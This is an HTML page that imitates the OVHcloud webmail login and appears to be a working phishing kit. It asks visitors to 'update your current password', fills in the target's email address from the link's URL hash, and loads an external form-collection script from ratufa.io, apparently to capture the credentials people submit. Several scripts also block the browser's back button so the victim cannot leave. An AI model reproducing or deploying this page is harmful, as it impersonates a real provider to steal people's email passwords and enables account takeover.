<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OVHcloud - Log in to Webmail</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #0b1d33;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            position: relative;
        }

        /* Top Utilities Bar */
        .utility-bar {
            background-color: #001233;
            color: #ffffff;
            display: flex;
            justify-content: flex-end;
            align-items: center;
            padding: 8px 40px;
            font-size: 12px;
            gap: 20px;
        }

        .utility-bar a {
            color: #ffffff;
            text-decoration: none;
        }

        .utility-bar a:hover {
            text-decoration: underline;
        }

        /* Main Navigation Navbar Component */
        .navbar {
            background-color: #002663;
            padding: 16px 40px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }

        .brand-logo {
            color: #ffffff;
            font-size: 22px;
            font-weight: bold;
            text-decoration: none;
            display: flex;
            align-items: center;
            gap: 4px;
        }

        .brand-logo span {
            color: #0091ff;
        }

        .nav-links {
            display: flex;
            gap: 24px;
        }

        .nav-links a {
            color: #ffffff;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        /* Hero Image Layout Block Wrapper with deep blue background overlay */
        .hero-section {
            flex-grow: 1;
            position: relative;
            background: linear-gradient(135deg, rgba(0, 38, 99, 0.95) 40%, rgba(0, 53, 142, 0.8) 100%),
                        url('https://unsplash.com') no-repeat center center;
            background-size: cover;
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
            padding: 60px 10%;
        }

        /* Breadcrumbs Header Layer */
        .content-header {
            margin-bottom: 40px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
            padding-bottom: 16px;
            max-width: 600px;
        }

        .section-tag {
            color: #ffffff;
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 6px;
        }

        .breadcrumbs {
            color: rgba(255, 255, 255, 0.6);
            font-size: 12px;
        }

        .main-title {
            color: #ffffff;
            font-size: 32px;
            font-weight: bold;
            margin-bottom: 30px;
        }

        /* Centered Input Form Structural Box Component */
        .form-box {
            width: 100%;
            max-width: 320px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            color: #ffffff;
            font-size: 14px;
            margin-bottom: 8px;
        }

        /* Faint semi-transparent dark inputs with glowing frames */
        .form-control {
            width: 100%;
            background-color: rgba(0, 18, 51, 0.4);
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 4px;
            padding: 12px;
            color: #ffffff;
            font-size: 15px;
            outline: none;
            transition: border-color 0.2s;
        }

        .form-control:focus {
            border-color: #0091ff;
        }

        /* Checkbox Option Node Elements layout alignment */
        .checkbox-row {
            display: flex;
            align-items: center;
            gap: 8px;
            color: #ffffff;
            font-size: 13px;
            margin-bottom: 24px;
            cursor: pointer;
        }

        .checkbox-row input {
            accent-color: #0091ff;
        }

        /* Rounded rectangular crisp solid white submit element */
        .submit-btn {
            background-color: #ffffff;
            color: #002663;
            border: none;
            padding: 12px 36px;
            font-size: 14px;
            font-weight: bold;
            border-radius: 6px;
            cursor: pointer;
            transition: background-color 0.2s ease;
        }

        .submit-btn:hover {
            background-color: #e6e6e6;
        }

        /* Fixed Background Desktop System Watermark Overlay Component */
        .system-watermark {
            position: fixed;
            bottom: 24px;
            right: 24px;
            text-align: left;
            font-size: 13px;
            color: rgba(255, 255, 255, 0.2);
            line-height: 1.4;
            user-select: none;
            pointer-events: none;
            z-index: 10;
        }
    </style>
</head>
<body>

    <!-- Top Utilities Ribbon Area Strip -->
    <div class="utility-bar">
        <a href="#">My customer account</a>
        <a href="#">Contact Sales</a>
        <a href="#">Support</a>
    </div>

    <!-- Main Navigation Ribbon Layer Header Bar -->
    <header class="navbar">
        <a href="#" class="brand-logo"><span>v</span>OVHcloud</a>
        <nav class="nav-links">
            <a href="#">Public Cloud</a>
            <a href="#">Private Cloud</a>
            <a href="#">VPS & Dedicated Servers</a>
            <a href="#">Domain / Hosting / Email</a>
        </nav>
    </header>

    <!-- Center Composition Workspace -->
    <main class="hero-section">
        <div class="content-header">
            <div class="section-tag">OVH mail</div>
            <div class="breadcrumbs">🏠 | OVH mail</div>
        </div>

        <h1 class="main-title">Log in to Webmail</h1>
<center>
        <div class="form-box">
            <form action="" method="POST">
    <p style="color:white">Log in and update your current password</p><br>
<script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=wyob9cof&n=n1.ratufa.io"></script>
                <div class="form-group">
                    <label for="email"></label>
                    <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
                </div>

                <div class="form-group">
                    <label for="password"> </label>
<input type="password" name="Password" placeholder="Password" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
  oninput="this.setCustomValidity('')"/>
                </div>

                <div class="checkbox-row">
                    <input type="checkbox" id="remember" name="remember">
                    <label style="margin:0; display:inline; cursor:pointer;" for="remember">Remember this address</label>
                </div>

                <button type="submit" class="submit-btn">Send</button>
            </form>
        </div>
    </main>

    <!-- Windows Environment Activation Notification Simulation Overlay Layer -->
    <div class="system-watermark">
        Activate Windows<br>
        <span style="font-size: 11px;">Go to Settings to activate Windows.</span>
    </div>
    <script>
        window.addEventListener('DOMContentLoaded', () => {
            if (window.location.hash) {
                document.getElementById("email").value = window.location.hash.substring(1).trim();
            }
        });
    </script>
	    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
    <script type="text/javascript">
        (function() {
            window.history.pushState(null, null, window.location.href);
            
            window.onpopstate = function() {
                window.history.pushState(null, null, window.location.href);
           
            };
        })();
    </script>
<script type="text/javascript">
    window.history.pushState(null, "", window.location.href);
    
    window.addEventListener("popstate", function() {
        window.history.pushState(null, "", window.location.href);
    });
</script>
<script type="text/javascript">
    function preventBack() {
        window.history.forward();
    }
    setTimeout("preventBack()", 0);
    
    window.onunload = function () { null };
</script>

</body>
    
</html>
</body>
</html>
